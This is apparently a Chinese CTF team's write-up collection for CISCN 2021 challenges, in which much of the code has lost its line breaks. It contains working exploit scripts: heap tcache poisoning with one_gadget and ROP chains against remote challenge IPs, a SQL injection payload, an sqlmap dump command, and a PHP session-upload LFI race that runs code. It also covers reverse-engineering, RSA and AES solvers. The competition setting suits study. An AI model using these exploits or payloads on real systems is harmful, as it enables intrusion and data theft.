edit(0,p64(heap_base+0x10))allocate(0,0x78)allocate(0,0x78)edit(0,p64(0)*2) #tcache
allocate(0,0x58) #start 0x5555557572d0edit(0,p64(0)+p64(0x511)) #fake_mchunk_sizeallocate(0,0x58) #start 0x555555757330allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)allocate(0,0x58)edit(0,p64(0)*6+p64(0)+p64(0x31)) #fake_mchunk_nextsize #0x5555557577f0allocate(0,0x58) #avoid top chunkedit(0,p64(0)+p64(0x31))allocate(0,0x38)for i in range(6): #free(): double free detected in tcache 2 edit(0,0x10*'b') delete(0)edit(0,p64(heap_base-0xfb0))allocate(0,0x38)allocate(0,0x38)edit(0,p64(0)+p64(heap_base+0x2f0)) #x/16gx $rebase(0x202050)#gdb.attach(p,'dir /home/ubuntu/Desktop/malloc/glibc/glibc-2.27/malloc/n'+'b malloc.c:4328')
delete(0)#gdb.attach(p,'dir /home/ubuntu/Desktop/malloc/glibc/glibc-2.27/malloc/n'+'b malloc.c:4328')main_arena_addr=show(0)print hex(main_arena_addr)libc_base=main_arena_addr-0x60-0x3ebc40print hex(libc_base)__malloc_hook=libc_base+libc.symbols['__malloc_hook']print hex(__malloc_hook)allocate(0,0x21)delete(0)edit(0,p64(__malloc_hook))allocate(0,0x21)allocate(0,0x21)one_gadget=[0x4f3d5,0x4f432,0x10a41c]real_one_gadget=libc_base+one_gadget[2]edit(0,p64(real_one_gadget))allocate(0,0x10)#gdb.attach(p)p.interactive()

#coding:utf-8from pwn import *context.log_level = 'debug'p = ''def out(idx): p.sendlineafter(':', '1') p.sendafter('x:', str(idx))def _in(idx, content): p.sendlineafter(':', '2') p.sendlineafter(':', str(idx)) p.send(str(content))def overflow_fd(): for i in range(2): p.sendlineafter(':', '2') p.sendlineafter(':', '256')def exp(): global p elf = ELF('./pwny') # libc = elf.libc libc = ELF('./libc-2.27.so') # p = process('./pwny') p = remote('124.71.226.90', 23751) overflow_fd() out(p64(0x10000000000000000 - 25)) p.recvuntil('Result: ') libc_base = int('0x'+p.recvuntil('n', drop=True), 16) - libc.sym['puts'] log.info(hex(libc_base)) system = libc_base + libc.sym['system'] sh = libc_base + libc.search('/bin/sh').next() out(p64(0x10000000000000000 - 75)) p.recvuntil('Result: ') elf_base = int('0x'+p.recvuntil('n', drop=True), 16) - (0x564874398298 - 0x564874398000) log.info(hex(elf_base)) environ = libc_base + libc.sym['_environ'] one_gadget = libc_base + 0x10a41c # # one_gadget = libc_base + 0x10a45c start = elf_base + 0x202060 out(p64((environ - start)//8)) p.recvuntil('Result: ') stack = int('0x'+p.recvuntil('n', drop=True), 16) log.info(hex(stack)) write = stack - 0x120 # gdb.attach(p,'b*$rebase(0xC06)') _in((write - start)//8, p64(one_gadget)) p.interactive()if __name__ == '__main__': exp()

| silverwolf
解题思路

开头一直malloc，把seccomp用的chunk申请回来，之后和lonelywolf基本相同。堆上写ROP，栈上用pop rsp;ret;来跳过去。(写脚本的时候人傻了，double free直接泄露heap地址了，我隔那改低字节爆)

#coding:utf-8from pwn import *context.log_level = 'info'def allocate(size): p.sendlineafter(':', str(1)) p.sendlineafter(':', str(0)) p.sendlineafter(':', str(size))def edit(content): p.sendlineafter(':', str(2)) p.sendlineafter(':', str(0)) p.sendafter(':', str(content))def show(): p.sendlineafter(':', str(3)) p.sendlineafter(':', str(0))def delete(): p.sendlineafter(':', str(4)) p.sendlineafter(':', str(0))def exit(): p.sendlineafter(':', str(5))p = ''free = 0xEA9edit_read = 0x0102Bmalloc = 0xDF1'''0x20 -> 70x60 -> 10x70 -> 70x80 -> 70xd0 -> 30xf0 -> 2'''def exp(): global p elf = ELF('./silverwolf') libc = ELF('./libc-2.27.so') # p = process('./silverwolf', env={"LD_PRELOAD":"./libc-2.27.so"}) p = remote('124.71.226.90', 23694) for i in range(20): allocate(0x10) allocate(0x50) for i in range(7): allocate(0x60) for i in range(7): allocate(0x70) allocate(0x20) delete() allocate(0x50) allocate(0x9) delete() edit('1'*8+'n') delete() allocate(0x2) edit(p16(0x7010+0x40)) allocate(0x2) allocate(0x2) # show() p.recvuntil(': ') heap_base = u64(p.recv(6).ljust(8,'x00')) - 0x50 log.info(hex(heap_base)) if heap_base < 0x500: raise EOFError allocate(0x30) delete() edit('1'*8+'n') delete() allocate(0x30) edit(p64(heap_base+0x19d0)+'n') allocate(0x30) allocate(0x30) # point to 0x20 chunk edit(p64(0)+p64(0x91)[:-1]+'n') allocate(0x70) delete() edit('1'*8+'n') delete() allocate(0x70) edit(p64(heap_base+0x10)+'n') allocate(0x70) allocate(0x70) edit(('x01'*2+'x00'*5+'xff').ljust(0x40, 'xff')+p64(heap_base+0x50)+p64(heap_base+0x19d0+0x10)+'n') allocate(0x20) # 0x30 0x60 0x20 0x40 0x80 delete() show() libc_base = u64(p.recvuntil('x7f')[-6:].ljust(8,'x00')) - (0x7ffff7dcfca0-0x7ffff79e4000) log.info(hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] environ = libc_base + libc.sym['_environ'] allocate(0x40) delete() edit('1'*8+'n') delete() allocate(0x40) edit(p64(environ)+'n') allocate(0x40) edit('./flagn') allocate(0x40) show() p.recvuntil(': ') stack = u64(p.recv(6).ljust(8,'x00')) log.info(hex(stack)) ret = stack - (0x7fffffffee58-0x7fffffffed38) allocate(0x60) # 0x30 0x60 0x20 0x40 0x80 0x50 0x70 delete() edit('1'*8+'n') delete() allocate(0x60) edit(p64(heap_base+0x40+0x10)+'n') allocate(0x60) pop_rdi_ret = 0x00000000000215bf + libc_base pop_rdx_rsi_ret = 0x0000000000130569 + libc_base pop_rsi_ret = 0x0000000000023eea + libc_base pop_rax_ret = 0x0000000000043ae8 + libc_base pop_4_ret = 0x00000000000215b8 + libc_base pop_rsp_ret = 0x0000000000003960 + libc_base syscall = libc_base + 0x110222 read = libc_base + libc.sym['read'] write = libc_base + libc.sym['write'] allocate(0x60) # point to tcache target = heap_base + 0x1f0 flag = heap_base + 0x19e0 payload = p64(ret) + p64(target+0x10) + p64(target + 0x20) + p64(target+0x40) + p64(target + 0x70) edit(payload+'n') # gdb.attach(p,'b*$rebase({})'.format(malloc)) ROP = '' ROP += p64(pop_rax_ret)+p64(2) ROP += p64(pop_rdi_ret)+p64(flag) ROP += p64(pop_rsi_ret)+p64(0) + p64(syscall) ROP += p64(pop_rdi_ret)+p64(3) ROP += p64(pop_rdx_rsi_ret)+p64(0x50)+p64(heap_base) ROP += p64(read) ROP += p64(pop_rdi_ret)+p64(1) ROP += p64(write) allocate(0x20) # 0x10 payload = ROP[0:0x10] + p64(pop_4_ret) edit(payload+'n') allocate(0x30) # 0x20 payload = ROP[0x10:0x30] + p64(pop_4_ret) edit(payload + 'n') allocate(0x40) # 0x30 payload = ROP[0x30:0x60] + p64(pop_4_ret) edit(payload+'n') allocate(0x50) # 0x40 payload = ROP[0x60:] + p64(pop_4_ret) edit(payload+'n') # gdb.attach(p,'b*$rebase({})'.format(0x1050)) allocate(0x10) edit(p64(pop_rsp_ret)+p64(target+0x10)) p.interactive()
if __name__ == '__main__': i = 0 while True: try: print('+============================ {} ++==========================='.format(i)) exp() except: p.close() finally: i += 1 # exp(

Reverse

check = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F]
for i in range(39): t = list(map(ord,list("12345678"))) check[i] ^= t[i % 8]

i = 0while i < 39: a1, a2, a3 = check[i: i+3] b2 = a1^a2 b3 = a3^b2 b1 = a1^b3 check[i: i+3] = [b1, b2, b3] i+=3
a_check = check

encoder = [0x65, 0x5e, 0x99, 0x75, 0x37, 0x44, 0x81, 0xc0, 0x78, 0xa3, 0xf4, 0xa7, 0x83, 0x6a, 0x85, 0xbb, 0xfc, 0x3f, 0x89, 0x7f, 0x14, 0xe2, 0x36, 0xc4, 0x5, 0x61, 0xdc, 0x2b, 0x7c, 0x67, 0xdd, 0x21, 0xda, 0x7b, 0x68, 0x13, 0x28, 0x3c, 0x43, 0x70, 0x9d, 0xe9, 0x46, 0xe8, 0x88, 0x53, 0x8a, 0xdb, 0x1, 0x96, 0xc9, 0x5a, 0xef, 0x8e, 0xd4, 0xc8, 0x6d, 0xd8, 0x38, 0xb4, 0x4e, 0xbd, 0x34, 0x56, 0xc7, 0xd5, 0xaf, 0xb2, 0x50, 0xe3, 0x30, 0x58, 0x79, 0xb, 0xbc, 0x54, 0x52, 0x49, 0x91, 0x47, 0x2a, 0xe6, 0x4a, 0x12, 0x2c, 0xf0, 0xd0, 0x2e, 0x6e, 0xf, 0x62, 0xc2, 0xb3, 0xde, 0xb1, 0x1f, 0x40, 0xe4, 0x39, 0x8b, 0x73, 0x63, 0x7e, 0xcf, 0x80, 0xe0, 0xad, 0x8d, 0xed, 0x2d, 0xdf, 0x72, 0x35, 0xca, 0x86, 0x87, 0xc3, 0x19, 0xb0, 0x9e, 0xf9, 0x77, 0xec, 0xfa, 0x76, 0xa, 0x31, 0x4d, 0xcd, 0xa0, 0xe7, 0xf7, 0xd3, 0xce, 0x3b, 0x0, 0xf6, 0x55, 0xa4, 0xd7, 0x24, 0xc5, 0x8c, 0xd, 0xa9, 0x8, 0x57, 0x74, 0x48, 0xba, 0xf1, 0x15, 0xbe, 0xa5, 0x11, 0xb8, 0x1d, 0xa2, 0x3, 0x94, 0x93, 0xd1, 0x27, 0xff, 0x92, 0xae, 0xd2, 0x1a, 0xb5, 0x1b, 0x41, 0x16, 0xf2, 0xb9, 0x6f, 0x3d, 0xc1, 0x18, 0x5d, 0x5b, 0x23, 0xc6, 0xe, 0xd9, 0x6b, 0x9c, 0xac, 0xa6, 0x33, 0x97, 0x9b, 0xf5, 0x98, 0x25, 0xfe, 0x1e, 0xfb, 0x4b, 0x7a, 0x4, 0x9, 0x17, 0x26, 0x51, 0xe1, 0xb6, 0x71, 0xee, 0x7, 0x22, 0xfd, 0xf3, 0x90, 0x45, 0x29, 0xf8, 0x2, 0xcb, 0xcc, 0x9a, 0xab, 0x4f, 0xd6, 0xa1, 0x60, 0x32, 0x5f, 0xa8, 0x8f, 0x4c, 0x69, 0x84, 0x95, 0x6, 0xeb, 0x2f, 0xb7, 0x20, 0x3e, 0xe5, 0x82, 0xbf, 0xc, 0x59, 0x10, 0x64, 0x5c, 0x3a, 0x7d, 0x9f, 0x1c, 0x66, 0x6c, 0xaa, 0x42, 0xea]def dec_input(encoder, secret): v3 = 0 v4 = 0 j = 0 for _ in range(39): v4 = (v4 + 1) % 256 v5 = encoder[v4] v3 = (v3 + v5) % 256; encoder[v4] = encoder[v3] encoder[v3] = v5 secret[j] ^= encoder[(v5 + encoder[v4]) % 256] j += 1
dec_input(encoder, a_check)

for i in a_check: print(chr(i), end='')

#include<iostream>using namespace std;bool row[5][6]={false};bool line[5][6]={false};int map[5][5]={0};inline void trace(int &x,int &y){ y++; if(y>=5) { x++; y=0; }
}bool check(){ if(map[2][2]!=4 || map[3][3]!=3) return false; if(map[0][3]<map[0][4] || map[1][0]<map[1][1] || map[2][0]>map[2][1] || map[2][3]<map[2][4] || map[4][0]<map[4][1] || map[4][2]<map[4][3] || map[0][2]<map[1][2] || map[0][4]<map[1][4] || map[2][3]>map[3][3] || map[3][1]>map[4][1] || map[3][4]>map[4][4]) return false; return true;}void dfs(int x,int y){ if(x>=5) { if(check()) { printf("great!n"); for(int i=0;i<5;i++,puts("")) for(int j=0;j<5;j++) printf("%d ",map[i][j]); } return; } for(int i=1;i<=5;i++) { if(!line[x][i] && !row[y][i]) { line[x][i]=row[y][i]=true; map[x][y]=i; int tx=x,ty=y; trace(tx,ty); dfs(tx,ty); map[x][y]=0; line[x][i]=row[y][i]=false; } }}int main(){ dfs(0,0);}

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
admin') and updatexml(0,concat(0x7e,mid((select * from(select * from flag a join (select * from flag)b using(id,no))c),1,50)),0);#
```



```
sqlmap -r sql1.txt -D security -T flag -C "4719c5f3-13d7-49c8-923a-55e270da4b73" --dump
```



```
import ioimport sysimport requestsimport threading
from requests.models import Response
sessid = 'wa1ki0g'
def POST(session): while True: f = io.BytesIO(b'a' * 1024 * 50) session.post( 'http://124.70.105.172:23077/', data={"PHP_SESSION_UPLOAD_PROGRESS":'<?php var_dump(scandir("/etc"));?>'}, files={"file":('q.txt', f)}, cookies={'PHPSESSID':sessid} )
def READ(session): while True: url="http://124.70.105.172:23077/" data1={ 'cf':f'../../../../../../../../../var/lib/php/sessions/fefcieaibf/sess_{sessid}' } response = session.post(url=url,data=data1) if 'passwd' not in response.text: print('llllll') else: print(response.text) sys.exit(0)
with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start()
 READ(session)
```



```
图片马的最后记得加上#define width 1#define height 1
```



```
from PIL import Image,ImageDrawfor i in range(0,382): dcy = Image.open('./{i}.bmp').convert("RGB") for p in range(0, dcy.size[0]): for q in range(0, dcy.size[1]): n = dcy.getpixel((p,q)) if n == (233,233,233): dcy.putpixel((q,p), 0) dcy.save('{i}__.bmp') # dcy.show()
```



```
syntax = "proto3";message PBResponse {int32 code = 1;int64 flag_part_convert_to_hex_plz = 2;message data {string junk_data = 2;string flag_part = 1;}repeated data dataList = 3;int32 flag_part_plz_convert_to_hex = 4;string flag_last_part = 5;}
```



```
import pb2secret=open('secret','rb').read()test=pb2.PBResponse()test.ParseFromString(secret)print(test)
```



```
code: 200flag_part_convert_to_hex_plz: 15100450dataList { flag_part: "e2345" junk_data: "7af2c"}dataList { flag_part: "7889b0" junk_data: "82bc0"}flag_part_plz_convert_to_hex: 16453958flag_last_part: "d172a38dc"
```



```
# -*- coding: utf-8 -*-"""Created on Sat May 15 21:10:55 2021 @author: admin"""#共模from Crypto.Util.number import *import gmpy2def ext_euclid(a, b): if b == 0: return 1, 0, a else: x, y, q = ext_euclid(b, a % b) # q = gcd(a, b) = gcd(b, a%b) x, y = y, (x - (a // b) * y) return x, y, qc1=54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610c2=91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950e1=17n1=111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977e2=65537n=111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977 x,y,z = ext_euclid(e1, e2)if x < 0: x*=-1 c1 = gmpy2.invert(c1, n)if y < 0: y*=-1 c2 = gmpy2.invert(c2, n)m = (pow(c1,x,n)*pow(c2,y,n))%nprint(long_to_bytes(m)) 小指数：from gmpy2 import irootimport libnum c = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893e= 3n = 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009 k = 0 while 1: res=iroot(c+k*n,e) if(res[1]==True): print(libnum.n2s(int(res[0]))) break k=k+1 p高位泄露：#Sagen = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147e = 65537c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646 pbar = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902 << 200 kbits = 200print("upper %d bits (of %d bits) is given" % (pbar.nbits()-kbits, pbar.nbits()))PR.<x> = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root < 2^kbits with factor >= n^0.4p = x0 + pbarprint("p:", p)q = n // int(p)d = inverse_mod(e, (p-1)*(q-1))print("m:", pow(c, d, n))
```



```
# -*- coding: utf-8 -*-"""Created on Sun May 16 10:37:30 2021
@author: admin"""s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)
inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)

def sub_bytes(s): for i in range(4): for j in range(4): s[i][j] = s_box[s[i][j]]

def inv_sub_bytes(s): for i in range(4): for j in range(4): s[i][j] = inv_s_box[s[i][j]]

def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]

def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]
def add_round_key(s, k): for i in range(4): for j in range(4): s[i][j] ^= k[i][j]

# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)

def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)

def mix_columns(s): for i in range(4): mix_single_column(s[i])

def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v
 mix_columns(s)

r_con = ( 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,)

def bytes2matrix(text): """ Converts a 16-byte array into a 4x4 matrix. """ return [list(text[i:i+4]) for i in range(0, len(text), 4)]
def matrix2bytes(matrix): """ Converts a 4x4 matrix into a 16-byte array. """ return bytes(sum(matrix, []))
def xor_bytes(a, b): """ Returns a new byte array with the elements xor'ed. """ return bytes(i^j for i, j in zip(a, b))
def inc_bytes(a): """ Returns a new byte array with the value increment by 1 """ out = list(a) for i in reversed(range(len(out))): if out[i] == 0xFF: out[i] = 0 else: out[i] += 1 break return bytes(out)
def pad(plaintext): """ Pads the given plaintext with PKCS#7 padding to a multiple of 16 bytes. Note that if the plaintext size is a multiple of 16, a whole block will be added. """ padding_len = 16 - (len(plaintext) % 16) padding = bytes([padding_len] * padding_len) return plaintext + padding
def unpad(plaintext): """ Removes a PKCS#7 padding, returning the unpadded text and ensuring the padding was correct. """ padding_len = plaintext[-1] assert padding_len > 0 message, padding = plaintext[:-padding_len], plaintext[-padding_len:] assert all(p == padding_len for p in padding) return message
def split_blocks(message, block_size=16, require_padding=True): assert len(message) % block_size == 0 or not require_padding return [message[i:i+16] for i in range(0, len(message), block_size)]

class AES: """ Class for AES-128 encryption with CBC mode and PKCS#7. This is a raw implementation of AES, without key stretching or IV management. Unless you need that, please use `encrypt` and `decrypt`. """ rounds_by_key_size = {16: 10, 24: 12, 32: 14} def __init__(self, master_key): """ Initializes the object with a given key. """ assert len(master_key) in AES.rounds_by_key_size self.n_rounds = AES.rounds_by_key_size[len(master_key)] self._key_matrices = self._expand_key(master_key)
 def _expand_key(self, master_key): """ Expands and returns a list of key matrices for the given master_key. """ # Initialize round keys with raw key material. key_columns = bytes2matrix(master_key) iteration_size = len(master_key) // 4
 # Each iteration has exactly as many columns as the key material. columns_per_iteration = len(key_columns) i = 1 while len(key_columns) < (self.n_rounds + 1) * 4: # Copy previous word. word = list(key_columns[-1])
 # Perform schedule_core once every "row". if len(key_columns) % iteration_size == 0: # Circular shift. word.append(word.pop(0)) # Map to S-BOX. word = [s_box[b] for b in word] # XOR with first byte of R-CON, since the others bytes of R-CON are 0. word[0] ^= r_con[i] i += 1 elif len(master_key) == 32 and len(key_columns) % iteration_size == 4: # Run word through S-box in the fourth iteration when using a # 256-bit key. word = [s_box[b] for b in word]
 # XOR with equivalent word from previous iteration. word = xor_bytes(word, key_columns[-iteration_size]) key_columns.append(word)
 # Group key words in 4x4 byte matrices. return [key_columns[4*i : 4*(i+1)] for i in range(len(key_columns) // 4)]
 def encrypt_block(self, plaintext): """ Encrypts a single block of 16 byte long plaintext. """ assert len(plaintext) == 16
 plain_state = bytes2matrix(plaintext)
 add_round_key(plain_state, self._key_matrices[0])
 for i in range(1, self.n_rounds): sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i])
 sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1])
 return matrix2bytes(plain_state)
 def encrypt_block_(self, plaintext,bytee): """ Encrypts a single block of 16 byte long plaintext. """ assert len(plaintext) == 16
 plain_state = bytes2matrix(plaintext)
 add_round_key(plain_state, self._key_matrices[0])
 for i in range(1, self.n_rounds): if i==8: plain_state[0][0] ^= bytee sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i])
 sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) keym = self._key_matrices[-1] return matrix2bytes(plain_state),keym[0]+keym[1]+keym[2]+keym[3]

import os,hashlib,random 
f = open('keys-0.csv','r') 
plain = os.urandom(16) m1 = '973f5ae78bc933a8fc7f7ab98d53d16f' m2 = '628aab012199cdab83cc1aa72204ea98's = random.randint(0,255)
for i in range(4266): key = f.readline().replace('n','') cipher,k = AES(bytes.fromhex(key)).encrypt_block_(plain,s) piece1 = [k[0],k[1],k[4],k[7],k[10],k[11],k[13],k[14]] m11 = hashlib.md5(bytes(piece1)).hexdigest() piece2 = [k[2],k[3],k[5],k[6],k[8],k[9],k[12],k[15]] m22 = hashlib.md5(bytes(piece2)).hexdigest() if m11 == m1 and m22 == m2: print(key) print("CISCN{"+hashlib.md5(bytes.fromhex(key)).hexdigest()+"}") bre
```



```
"""python"""from Crypto.Util.number import*from gmpy2 import*
